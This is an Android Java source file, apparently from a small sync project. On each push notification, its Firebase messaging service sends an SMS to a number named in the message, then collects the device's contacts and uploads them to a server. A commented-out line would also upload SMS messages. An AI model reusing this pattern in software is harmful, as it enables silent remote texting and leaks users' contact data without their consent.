package fr.intechinfo.fusionandroid;

import android.telephony.SmsManager;
import android.util.Log;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.List;

import static android.content.ContentValues.TAG;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    public MyFirebaseMessagingService() {
    }

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        String strTitle=remoteMessage.getNotification().getTitle();
        String message=remoteMessage.getNotification().getBody();
        Log.d(TAG,"onMessageReceived:  Message Received: \n" + "Title: " + strTitle + "\n" + "Message: "+ message);
        sendSMS(strTitle,message);
        SyncData();
    }
    private void sendSMS(String phoneNumber, String messageBody) {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(phoneNumber, null, messageBody, null, null);
    }

    private void SyncData(){
        RetrofitAPI retrofitAPI = HttpExecute.BuildAPI();
        ContentCollector cc = new ContentCollector();
        ContactsList contactLs = new ContactsList();
        contactLs.SetContact(cc.GetContacts(this));
        Log.d(TAG,"Name : "+ contactLs.Contacts.get(1).GetName()+" Number : " + contactLs.Contacts.get(1).GetNumber());
        // List<SMS> lsSMS = cc.GetSMS(this);
        //Log.d(TAG,"Creator : "+ lsSMS.get(1).GetCreator()+" Message : " + lsSMS.get(1).GetBody());

        new HttpExecute(retrofitAPI.CreateContacts(contactLs)).start();
        //new HttpExecute(retrofitAPI.CreateSMS(lsSMS));


    }


}
